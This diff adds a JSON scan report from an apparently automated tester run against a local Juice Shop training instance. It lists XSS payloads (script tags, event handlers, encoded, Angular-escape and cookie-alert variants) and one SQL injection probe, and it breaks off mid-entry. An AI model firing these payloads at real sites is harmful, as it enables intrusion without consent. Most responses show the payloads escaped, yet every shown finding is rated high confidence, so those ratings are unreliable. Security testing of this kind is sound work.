@@ -1,0 +1,590 @@
+{
+  "target": "http://localhost:3000",
+  "scan_time": "2026-09-18T10:59:44.160370",
+  "crawl_done": true,
+  "auth_attempted": true,
+  "total_findings": 28,
+  "findings_by_type": {
+    "XSS": 26,
+    "SQL Injection": 1,
+    "Broken Access Control": 1
+  },
+  "findings": [
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "script_tag",
+      "payload": "<script>alert(1)</script>",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;script&gt;alert(1)&lt;/script&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webki"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "img_onerror",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;img src=x onerror=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-f"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "svg_onload",
+      "payload": "<svg onload=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;svg onload=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smo"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "body_onload",
+      "payload": "<body onload=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;body onload=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-sm"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "iframe_onload",
+      "payload": "<iframe onload=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe onload=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "input_onfocus",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;input onfocus=alert(1) autofocus&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -we"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "marquee_onstart",
+      "payload": "<marquee onstart=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;marquee onstart=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-fon"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "details_open",
+      "payload": "<details open ontoggle=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;details open ontoggle=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "img_onmouseover",
+      "payload": "<img src=x onmouseover=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;img src=x onmouseover=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "svg_onmouseover",
+      "payload": "<svg onmouseover=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;svg onmouseover=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-fon"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "div_onclick",
+      "payload": "<div onclick=alert(1)>click me</div>",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;div onclick=alert(1)&gt;click me&lt;/div&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #55"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "reflected",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "button_onclick",
+      "payload": "<button onclick=alert(1)>btn</button>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;button onclick=alert(1)&gt;btn&lt;/button&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #5"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "encoded",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "html_entity_encode",
+      "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "evidence": {
+        "findings": [
+          "marker_detected"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "encoded",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "url_encode_script",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: %3Cscript%3Ealert(1)%3C%2Fscript%3E</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "encoded",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "double_url_encode",
+      "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: %253Cscript%253Ealert(1)%253C%252Fscript%253E</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "evasive",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "mixed_encoding",
+      "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "evidence": {
+        "findings": [
+          "marker_detected"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-re"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "attribute",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "attr_break_quote",
+      "payload": "\" onmouseover=\"alert(1)",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &quot; onmouseover=&quot;alert(1)</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-fo"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "attribute",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "attr_break_apos",
+      "payload": "' onmouseover='alert(1)",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &#39; onmouseover=&#39;alert(1)</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "attribute",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "attr_img_tag",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n "
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "framework",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "angular_escape_1",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: {{constructor.constructor(&#39;alert(1)&#39;)()}}</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #5"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "framework",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "angular_escape_2",
+      "payload": "{{$eval.constructor('alert(1)')()}}",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: {{$eval.constructor(&#39;alert(1)&#39;)()}}</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  "
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "framework",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "angular_escape_3",
+      "payload": "{{''.__proto__.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)')}}",
+      "evidence": {
+        "findings": [
+          "marker_detected"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: {{&#39;&#39;.__proto__.constructor.prototype.charAt=&#39;&#39;.valueOf;$eval(&#39;x=alert(1)&#39;)}}</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #E"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "stored",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "markdown_img",
+      "payload": "![alt](x onerror=alert(1)>)",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: ![alt](x onerror=alert(1)&gt;)</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "detect",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "alert_cookie",
+      "payload": "<script>alert(document.cookie)</script>",
+      "evidence": {
+        "findings": [
+          "payload_reflected",
+          "marker_detected"
+        ],
+        "payload_reflected": true,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: "
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "detect",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "write_test",
+      "payload": "<script>document.write('XSS_TEST_MARKER')</script>",
+      "evidence": {
+        "findings": [
+          "marker_detected"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": false,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;script&gt;document.write(&#39;XSS_TEST_MARKER&#39;)&lt;/script&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: n"
+    },
+    {
+      "vulnerability": "XSS",
+      "subtype": "detect",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "src_marker_img",
+      "payload": "<img src=x onerror=\"document.body.innerHTML+='XSS_MARKER'\">",
+      "evidence": {
+        "findings": [
+          "marker_detected",
+          "event_handler_in_response"
+        ],
+        "payload_reflected": false,
+        "marker_hit": true,
+        "event_handler_pattern": true,
+        "in_script_context": false
+      },
+      "confidence": "high",
+      "response_status": 406,
+      "response_body_snippet": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;img src=x onerror=&quot;document.body.innerHTML+=&#39;XSS_MARKER&#39;&quot;&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  backgro"
+    },
+    {
+      "vulnerability": "SQL Injection",
+      "subtype": "boolean-based blind",
+      "endpoint": "http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop",
+      "parameter": "to",
+      "payload_name": "true_condition",
+      "payload": "' AND 1=1 --",
+      "evidence": {
+        "true_response_hash": "6df9c63745383740d939bd276c53bc5d",
+        "false_response_hash": "ba6f86bfeb757660e88894017696bdd4",
+        "diff_ratio": 0.001,
+        "true_body_length": 2526,
